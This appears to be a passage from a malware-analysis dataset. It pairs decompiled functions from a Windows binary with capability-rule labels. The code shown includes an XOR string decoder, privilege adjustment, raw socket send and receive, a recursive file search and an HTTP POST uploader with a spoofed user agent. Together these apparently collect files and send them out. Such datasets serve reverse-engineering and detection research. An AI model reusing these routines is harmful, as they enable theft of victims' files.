        "decompiled_code": "\nuint __cdecl fcn.0040278a(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*0x4123f8 != NULL) && (*0x4123fc != NULL)) && (*0x4123e4 != NULL)) {\n        uVar3 = 0;\n        hObject = 0;\n        iVar1 = (**0x4123f8)(0, arg_8h, &var_8h);\n        if (iVar1 != 0) {\n            uVar2 = sub.kernel32.dll_GetCurrentProcess();\n            iVar1 = (**0x4123e4)(uVar2, 0x20, &hObject);\n            if (iVar1 != 0) {\n                var_1ch = 1;\n                var_18h = var_8h;\n                var_14h = var_4h;\n                if (arg_ch == 0) {\n                    var_10h = 0;\n                }\n                else {\n                    var_10h = 2;\n                }\n            }\n            iVar1 = (**0x4123fc)(hObject, 0, &var_1ch, 0x10, 0, 0);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        if (hObject != 0) {\n            sub.kernel32.dll_CloseHandle(hObject);\n        }\n        return uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 383
    },
    "00402860": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402860(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t hMem;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        return 0;\n    }\n    iVar1 = sub.kernel32.dll_WideCharToMultiByte(0, 0, arg_8h, arg_ch, 0, 0, 0, 0);\n    iVar2 = 0;\n    if (iVar1 != 0) {\n        hMem = fcn.004017a5(iVar1);\n        if (hMem != 0) {\n            iVar1 = sub.kernel32.dll_WideCharToMultiByte(0, 0, arg_8h, arg_ch, hMem, iVar1, 0, 0);\n            iVar2 = hMem;\n            if (iVar1 == 0) {\n                fcn.0040178e(hMem);\n                iVar2 = 0;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 242
    },
    "004028dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004028dd(int32_t lpv, uint32_t iSize)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    \n    if ((iSize != 0) && (lpv != 0)) {\n        iVar1 = sub.advapi32.dll_IsTextUnicode(lpv, iSize, 0);\n        if (iVar1 == 0) {\n            arg_ch = fcn.004017a5(iSize + 1);\n            fcn.004017dc(lpv, arg_ch, iSize);\n        }\n        else {\n            lpv = fcn.00402860(lpv, iSize >> 1);\n        }\n        return lpv;\n    }\n    return 0;\n}\n",
        "token_count": 159
    },
    "0040292f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040292f(uint16_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    \n    if (arg_8h == NULL) {\n        return 0;\n    }\n    puVar3 = arg_8h;\n    if ((arg_ch & 1) == 0) {\n        do {\n            if (arg_ch == 0) {\n                return 1;\n            }\n            uVar2 = *arg_8h;\n            uVar1 = uVar2 >> 8;\n            if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                if ((uVar1 < 0x41) || (0x46 < uVar1)) {\n                    if ((uVar1 < 0x61) || (0x66 < uVar1)) {\n                        return 0;\n                    }\n                    uVar2 = uVar2 & 0xff | uVar1 + 0xa9 << 8;\n                }\n                else {\n                    uVar2 = uVar2 & 0xff | uVar1 - 0x37 << 8;\n                }\n            }\n            else {\n                uVar2 = uVar2 & 0xff | uVar1 - 0x30 << 8;\n            }\n            uVar1 = uVar2;\n            if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                if ((uVar1 < 0x41) || (0x46 < uVar1)) {\n                    if ((uVar1 < 0x61) || (0x66 < uVar1)) {\n                        return 0;\n                    }\n                    uVar2 = uVar2 & 0xff00 | uVar1 + 0xa9;\n                }\n                else {\n                    uVar2 = uVar2 & 0xff00 | uVar1 - 0x37;\n                }\n            }\n            else {\n                uVar2 = uVar2 & 0xff00 | uVar1 - 0x30;\n            }\n            *puVar3 = uVar2 << 4 | uVar2 >> 8;\n            arg_ch = arg_ch - 2;\n            arg_8h = arg_8h + 1;\n            puVar3 = puVar3 + 1;\n        } while( true );\n    }\n    return 0;\n}\n",
        "token_count": 541
    },
    "00402a28": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402a41)\n// WARNING: Removing unreachable block (ram,0x00402a4b)\n// WARNING: Removing unreachable block (ram,0x00402a54)\n// WARNING: Removing unreachable block (ram,0x00402a62)\n// WARNING: Removing unreachable block (ram,0x00402a7e)\n// WARNING: Removing unreachable block (ram,0x00402a9c)\n// WARNING: Removing unreachable block (ram,0x00402aa6)\n// WARNING: Removing unreachable block (ram,0x00402aac)\n// WARNING: Removing unreachable block (ram,0x00402ad0)\n// WARNING: Removing unreachable block (ram,0x00402ae4)\n// WARNING: Removing unreachable block (ram,0x00402af5)\n// WARNING: Removing unreachable block (ram,0x00402af6)\n// WARNING: Removing unreachable block (ram,0x00402afe)\n// WARNING: Removing unreachable block (ram,0x00402b06)\n// WARNING: Removing unreachable block (ram,0x00402b0e)\n// WARNING: Removing unreachable block (ram,0x00402a5d)\n\nulong __fastcall fcn.00402a28(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    uint lpString1;\n    uint var_ch;\n    uint var_8h;\n    uint hObject;\n    \n    return CONCAT44(in_EAX, param_2);\n}\n",
        "token_count": 323
    },
    "00402b13": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402b2f)\n// WARNING: Removing unreachable block (ram,0x00402b39)\n// WARNING: Removing unreachable block (ram,0x00402b42)\n// WARNING: Removing unreachable block (ram,0x00402b4b)\n// WARNING: Removing unreachable block (ram,0x00402b54)\n// WARNING: Removing unreachable block (ram,0x00402b5b)\n// WARNING: Removing unreachable block (ram,0x00402b82)\n// WARNING: Removing unreachable block (ram,0x00402b9a)\n// WARNING: Removing unreachable block (ram,0x00402ba2)\n// WARNING: Removing unreachable block (ram,0x00402bbb)\n// WARNING: Removing unreachable block (ram,0x00402be6)\n// WARNING: Removing unreachable block (ram,0x00402bef)\n// WARNING: Removing unreachable block (ram,0x00402c09)\n// WARNING: Removing unreachable block (ram,0x00402c86)\n// WARNING: Removing unreachable block (ram,0x00402c22)\n// WARNING: Removing unreachable block (ram,0x00402c2f)\n// WARNING: Removing unreachable block (ram,0x00402c4f)\n// WARNING: Removing unreachable block (ram,0x00402c58)\n// WARNING: Removing unreachable block (ram,0x00402c64)\n// WARNING: Removing unreachable block (ram,0x00402c6b)\n// WARNING: Removing unreachable block (ram,0x00402c70)\n// WARNING: Removing unreachable block (ram,0x00402c74)\n// WARNING: Removing unreachable block (ram,0x00402c8e)\n// WARNING: Removing unreachable block (ram,0x00402ca5)\n// WARNING: Removing unreachable block (ram,0x00402cb0)\n\nulong __cdecl fcn.00402b13(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint in_EDX;\n    uint phkResult;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_12ch;\n    uint pszFirst;\n    uint var_ch;\n    uint var_8h;\n    uint hObject;\n    \n    return CONCAT44(in_EAX, in_EDX);\n}\n",
        "token_count": 505
    },
    "00402cb7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402cb7(uint8_t *arg_8h)\n\n{\n    for (; *arg_8h != 0; arg_8h = arg_8h + 1) {\n        for (; *arg_8h != 0; arg_8h = arg_8h + 1) {\n            *arg_8h = *arg_8h ^ 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "00403664": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403664(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint name;\n    int32_t var_ch;\n    \n    iVar3 = 0;\n    iVar1 = sub.wsock32.dll_socket(2, 1, 6);\n    if (iVar1 != -1) {\n        fcn.004017bc(&name, 0x10);\n        name._0_2_ = 2;\n        name._2_2_ = (arg_10h & 0xff) << 8 | arg_10h >> 8;\n        if (((arg_ch == 0) && ((arg_8h == 0 || (arg_ch = fcn.0040362a(arg_8h),  arg_ch == -1)))) ||\n           (var_ch = arg_ch,  iVar2 = sub.wsock32.dll_connect(),  iVar3 = iVar1,  iVar2 == -1)) {\n            sub.wsock32.dll_closesocket(iVar1);\n            iVar3 = 0;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 277
    },
    "004036e8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004036e8(uint s, uint arg_ch, int32_t len)\n\n{\n    int32_t iVar1;\n    \n    if (len == 0) {\n        return 1;\n    }\n    do {\n        iVar1 = sub.wsock32.dll_send();\n        if (iVar1 < 1) {\n            return 0;\n        }\n        len = len - iVar1;\n    } while (len != 0);\n    return 1;\n}\n",
        "token_count": 102
    },
    "00403806": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403806(uint s, int32_t *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint buf;\n    \n    uVar3 = 0;\n    iVar1 = fcn.00403734(s, 0x5a);\n    if (iVar1 != 0) {\n        do {\n            iVar4 = 0x5a;\n            iVar1 = fcn.00403734(s, 0x5a);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            uVar2 = arg_10h;\n            if (0x800 < arg_10h) {\n                uVar2 = 0x800;\n            }\n            iVar1 = sub.wsock32.dll_recv(s, &buf, uVar2, 0);\n            if (iVar1 < 0) {\n                return 0;\n            }\n            if (iVar1 == 0) {\n                return 1;\n            }\n            (**(*arg_ch + 0x10))(arg_ch, &buf, iVar1, 0, iVar1);\n            arg_10h = arg_10h - iVar4;\n        } while (arg_10h != 0);\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 306
    },
    "0040388e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040388e(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = 0;\n    do {\n        fcn.00401051(arg_8h, iVar1, 0);\n        var_4h = 0;\n        (**(*arg_8h + 0xc))(arg_8h, &var_4h, 4, &var_8h);\n        if (var_4h == 0xa0d0a0d) {\n            return iVar1 + 4;\n        }\n        iVar1 = iVar1 + 1;\n    } while (var_8h != 0);\n    return 0;\n}\n",
        "token_count": 175
    },
    "004038dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.004038dc(uint arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    int32_t *piVar8;\n    char *var_ch;\n    char *var_8h;\n    uint pszFirst;\n    \n    pszFirst = fcn.004017a5(32000);\n    fcn.00401000(&fcn.004038dc::var_ch);\n    pcVar5 = NULL;\n    do {\n        iVar2 = fcn.00403794(arg_8h, var_ch, 64000, 10);\n        if ((iVar2 == 0) || (uVar3 = fcn.00401091(var_ch),  64000 < uVar3)) goto code_r0x00403a46;\n        piVar8 = var_ch;\n        iVar2 = fcn.0040388e(var_ch);\n    } while (iVar2 == 0);\n    fcn.004012e8(var_ch);\n    (**(*var_ch + 0xc))(var_ch, pszFirst, 0x2134, 0);\n    var_8h = NULL;\n    pszFirst = 0x403967;\n    iVar2 = sub.shlwapi.dll_StrStrIA();\n    var_ch = NULL;\n    if (iVar2 != 0) {\n        var_8h = \"Content-Length:\";\n        var_ch = 0x403978;\n        iVar4 = sub.kernel32.dll_lstrlenA();\n        var_ch = iVar2 + iVar4;\n        pcVar6 = var_ch + 1;\n        iVar2 = 0x1194;\n        pcVar5 = pcVar6;\n        do {\n            pcVar7 = pcVar5;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar7 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar7;\n        } while (cVar1 != '\\r');\n        pcVar7[-1] = '\\0';\n        var_8h = sub.shlwapi.dll_StrToIntA(pcVar6, pcVar7);\n        pcVar6[-1] = '\\r';\n    }\n    pcVar5 = var_ch;\n    var_ch = \"Location:\";\n    iVar2 = sub.shlwapi.dll_StrStrIA(pszFirst);\n    if (iVar2 != 0) {\n        iVar4 = sub.kernel32.dll_lstrlenA(\"Location:\");\n        piVar8 = iVar2 + iVar4;\n        iVar2 = 0x1194;\n        pcVar6 = piVar8 + 1;\n        do {\n            pcVar5 = pcVar6;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar5 = pcVar6 + 1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar5;\n        } while (cVar1 != '\\r');\n        pcVar5[-1] = '\\0';\n        iVar4 = 0x4039e2;\n        iVar2 = fcn.0040283f(0x4039e2);\n        if (arg_10h == NULL) {\n            fcn.0040178e(iVar2);\n        }\n        else {\n            *arg_10h = iVar2;\n            iVar2 = iVar4;\n        }\n        *(iVar2 + -1) = 0xd;\n    }\n    fcn.00401356(var_ch, piVar8);\n    if (var_8h == NULL) {\n        var_8h = 0xa00000;\n    }\n    fcn.00403806(arg_8h, var_ch, var_8h);\n    iVar2 = fcn.00401091(var_ch);\n    if (((iVar2 != 0) && (iVar2 != 0)) && (iVar2 = (**(*var_ch + 0x34))(var_ch, arg_ch),  -1 < iVar2)) {\n        pcVar5 = 0x1;\n    }\ncode_r0x00403a46:\n    (**(*var_ch + 8))(var_ch);\n    fcn.0040178e(pszFirst);\n    return pcVar5;\n}\n",
        "token_count": 964
    },
    "00403a8f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00403a8f(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint len;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    int32_t s;\n    uchar *var_48h;\n    uint lpString;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uchar *var_10h;\n    uint var_ch;\n    \n    var_54h = 0;\n    iVar2 = 0;\n    var_40h = fcn.004017a5(0x1000);\n    var_48h = fcn.004017a5(0x1000);\n    lpString = fcn.004017a5(0x1000);\n    var_58h = fcn.004017a5(0x1000);\n    var_5ch = 0x1000;\n    puVar3 = &var_3ch;\n    for (iVar1 = 0x3c; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_3ch = 0x3c;\n    var_2ch = var_40h;\n    var_10h = var_48h;\n    var_28h = 0xfff;\n    var_ch = 0xfff;\n    iVar1 = sub.wininet.dll_InternetCrackUrlA(arg_8h, 0, 0x80000000, &var_3ch);\n    if ((iVar1 != 0) && (var_2ch != 0)) {\n        var_50h = 0xfff;\n        iVar1 = sub.wininet.dll_InternetCreateUrlA(&var_3ch, 0x80000000, lpString, &var_50h);\n        if (iVar1 != 0) {\n            *var_48h = 0;\n            puVar3 = &var_3ch;\n            for (iVar1 = 0x3c; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            var_3ch = 0x3c;\n            var_10h = var_48h;\n            var_28h = 0xfff;\n            var_ch = 0xfff;\n            iVar1 = sub.wininet.dll_InternetCrackUrlA(lpString, 0, 0, &var_3ch);\n            if ((iVar1 != 0) && (var_2ch != 0)) {\n                iVar1 = sub.urlmon.dll_ObtainUserAgentString(0, var_58h, &var_5ch);\n                if (iVar1 < 0) {\n                    sub.user32.dll_wsprintfA\n                              (lpString, \n                               \"POST %s HTTP/1.0\\r\\nHost: %s\\r\\nAccept: */*\\r\\nAccept-Encoding: identity, *;q=0\\r\\nAccept-Language: en-US\\r\\nContent-Length: %lu\\r\\nContent-Type: application/octet-stream\\r\\nConnection: close\\r\\nContent-Encoding: binary\\r\\nUser-Agent: %s\\r\\n\\r\\n\"\n                               , var_48h, var_40h, arg_10h, \n                               \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0)\");\n                }\n                else {\n                    sub.user32.dll_wsprintfA\n                              (lpString, \n                               \"POST %s HTTP/1.0\\r\\nHost: %s\\r\\nAccept: */*\\r\\nAccept-Encoding: identity, *;q=0\\r\\nAccept-Language: en-US\\r\\nContent-Length: %lu\\r\\nContent-Type: application/octet-stream\\r\\nConnection: close\\r\\nContent-Encoding: binary\\r\\nUser-Agent: %s\\r\\n\\r\\n\"\n                               , var_48h, var_40h, arg_10h, var_58h);\n                }\n                iVar1 = fcn.00403664(var_40h, 0, var_24h);\n                if (iVar1 != 0) {\n                    s = iVar1;\n                    fcn.00403a61(iVar1);\n                    len = sub.kernel32.dll_lstrlenA(lpString);\n                    iVar1 = fcn.004036e8(s, lpString, len);\n                    if ((iVar1 != 0) &&\n                       (((arg_10h == 0 || (iVar1 = fcn.004036e8(s, arg_ch, arg_10h),  iVar1 != 0)) &&\n                        (iVar2 = iVar1,  iVar1 != 0)))) {\n                        iVar2 = fcn.004038dc(s, arg_14h, &var_54h);\n                    }\n                    sub.wsock32.dll_closesocket(s);\n                }\n            }\n        }\n    }\n    fcn.0040178e(var_40h);\n    fcn.0040178e(lpString);\n    fcn.0040178e(var_48h);\n    fcn.0040178e(var_58h);\n    if (var_54h != 0) {\n        fcn.0040178e(var_54h);\n    }\n    return iVar2;\n}\n",
        "token_count": 1241
    },
    "00403c92": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403c92(uint arg_8h, int32_t pstm, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_10h_00;\n    uint uVar2;\n    uint var_8h;\n    uint phglobal;\n    \n    uVar2 = 0;\n    if ((pstm != 0) && (arg_10h != 0)) {\n        iVar1 = sub.ole32.dll_GetHGlobalFromStream(pstm, &phglobal);\n        if (-1 < iVar1) {\n            arg_10h_00 = fcn.00401091(pstm);\n            iVar1 = sub.kernel32.dll_GlobalLock(phglobal);\n            if (iVar1 != 0) {\n                uVar2 = fcn.00403a8f(arg_8h, iVar1, arg_10h_00, arg_10h);\n                sub.kernel32.dll_GlobalUnlock(phglobal);\n            }\n        }\n        fcn.004012c2(pstm);\n    }\n    return uVar2;\n}\n",
        "token_count": 232
    },
    "00403d12": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d12(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    if ((arg_8h != 0) && (arg_10h != 0)) {\n        fcn.00401522(arg_8h, arg_14h);\n        fcn.00401558(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "00403d3e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d3e(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    if ((arg_8h != 0) && (arg_ch != 0)) {\n        fcn.00401522(arg_8h, arg_10h);\n        fcn.00401584(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "00403d67": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403d67(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t lpFileName;\n    int32_t iVar1;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    lpFileName = fcn.00401dcb(arg_ch);\n    if (lpFileName != 0) {\n        iVar1 = fcn.00401d47(lpFileName);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00401e0f(lpFileName, &var_10h);\n            if (iVar1 != 0) {\n                if (var_4h < 0x100000) {\n                    iVar1 = fcn.004021bb(var_8h, var_4h);\n                    if (iVar1 == 0) {\n                        fcn.00403d12(arg_8h, var_8h, var_4h, arg_10h);\n                    }\n                }\n                fcn.00401ea4(&var_10h);\n            }\n        }\n        fcn.0040178e(lpFileName);\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "00403dd8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403dd8(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t lpFileName;\n    int32_t iVar1;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    lpFileName = fcn.00401dcb(arg_ch);\n    if (lpFileName != 0) {\n        iVar1 = fcn.00401d47(lpFileName);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00401e0f(lpFileName, &var_10h);\n            if (iVar1 != 0) {\n                if (var_4h < 0x100000) {\n                    fcn.00403d12(arg_8h, var_8h, var_4h, arg_10h);\n                }\n                fcn.00401ea4(&var_10h);\n            }\n        }\n        fcn.0040178e(lpFileName);\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "00403e3a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403e3a(uint arg_8h)\n\n{\n    int32_t lpFileName;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar2 = 0;\n    lpFileName = fcn.00401dcb(arg_8h);\n    if (lpFileName != 0) {\n        iVar1 = fcn.00401d47(lpFileName);\n        if (iVar1 != 0) {\n            iVar1 = fcn.00401e0f(lpFileName, &var_10h);\n            if (iVar1 != 0) {\n                if (var_4h < 0x100000) {\n                    iVar1 = fcn.004021bb(var_8h, var_4h);\n                    if (iVar1 != 0) {\n                        uVar2 = 1;\n                    }\n                }\n                fcn.00401ea4(&var_10h);\n            }\n        }\n        fcn.0040178e(lpFileName);\n    }\n    return uVar2;\n}\n",
        "token_count": 247
    },
    "00403ea1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pszFirst\n\nvoid __cdecl fcn.00403ea1(uchar *arg_8h, char *arg_ch, int32_t pszSrch, uint arg_14h, code *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *hMem;\n    uint pszFirst;\n    uint lpFileName;\n    uint hFindFile;\n    uint32_t lpFindFileData;\n    uchar auStack280 [276];\n    \n    lpFileName = 0;\n    if ((arg_ch != NULL) && (*arg_ch != '\\0')) {\n        iVar1 = fcn.004023cb(arg_ch);\n        if (iVar1 == 0) {\n            lpFileName = fcn.00401c09(arg_ch, \"\\\\*.*\");\n        }\n        else {\n            lpFileName = fcn.00401c09(arg_ch, 0x4127e7);\n        }\n        hMem = 0x13e;\n        fcn.004017bc(&lpFindFileData, 0x13e);\n        iVar1 = sub.kernel32.dll_FindFirstFileA(lpFileName, &lpFindFileData);\n        if (iVar1 != -1) {\n            do {\n                if ((lpFindFileData & 0x10) == 0) {\n                    if ((pszSrch == 0) || (hMem = auStack280,  iVar2 = sub.shlwapi.dll_StrStrIA(),  iVar2 != 0)) {\n                        uVar3 = fcn.00401c09(arg_ch, 0x4120b1);\n                        uVar3 = fcn.00401c5d(uVar3, auStack280);\n                        if (arg_18h == NULL) {\n                            fcn.00403d67(arg_8h, uVar3, arg_14h);\n                        }\n                        else {\n                            (*arg_18h)(arg_8h, uVar3, arg_14h, uVar3);\n                        }\n                        fcn.0040178e(hMem);\n                    }\n                }\n                else {\n                    hMem = 0x4127dd;\n                    iVar2 = sub.kernel32.dll_lstrcmpiA();\n                    if (iVar2 != 0) {\n                        hMem = 0x4127df;\n                        iVar2 = sub.kernel32.dll_lstrcmpiA();\n                        if (iVar2 != 0) {\n                            iVar2 = fcn.004023cb(arg_ch);\n                            if (iVar2 == 0) {\n                                uVar3 = fcn.00401c09(arg_ch, 0x4120b1);\n                            }\n                            else {\n                                uVar3 = fcn.00401c09(arg_ch, 0);\n                            }\n                            uVar3 = fcn.00401c5d(uVar3, auStack280);\n                            hMem = arg_8h;\n                            fcn.00403ea1(arg_8h, uVar3, pszSrch, arg_14h, arg_18h);\n                            fcn.0040178e(hMem);\n                        }\n                    }\n                }\n                iVar2 = sub.kernel32.dll_FindNextFileA(iVar1, &lpFindFileData);\n            } while (iVar2 != 0);\n            sub.kernel32.dll_FindClose(iVar1);\n        }\n    }\n    fcn.0040178e(lpFileName);\n    